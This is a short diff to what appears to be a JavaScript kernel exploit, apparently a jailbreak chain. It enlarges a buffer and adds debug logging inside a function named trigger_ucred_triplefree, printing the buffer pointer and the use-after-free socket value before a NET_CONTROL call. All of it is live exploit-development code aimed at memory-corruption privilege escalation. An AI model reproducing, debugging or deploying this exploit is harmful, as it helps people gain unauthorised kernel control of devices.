@@ -236,7 +236,7 @@ var cpu_mask_buf = malloc(0x10);
 var rtprio_scratch = malloc(0x4);
 var sockopt_val_buf = malloc(4);
 var nc_set_buf = malloc(8);
-var nc_clear_buf = malloc(8);
+var nc_clear_buf = malloc(16);
 var spawn_thr_args = malloc(0x80);
 var spawn_tid = malloc(0x8);
 var spawn_cpid = malloc(0x8);
@@ -1518,6 +1518,9 @@ function trigger_ucred_triplefree() {
 
     // قبل nc_call
     send_notification("[T] before_nc_call_clear");
+    send_notification("[T] nc_clear_buf_ptr=" + nc_clear_buf);
+    send_notification("[T] nc_clear_buf_size=16");
+    send_notification("[T] clear_queue_value=" + uaf_socket);
     nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
     send_notification("[T] after_nc_call_clear");
 
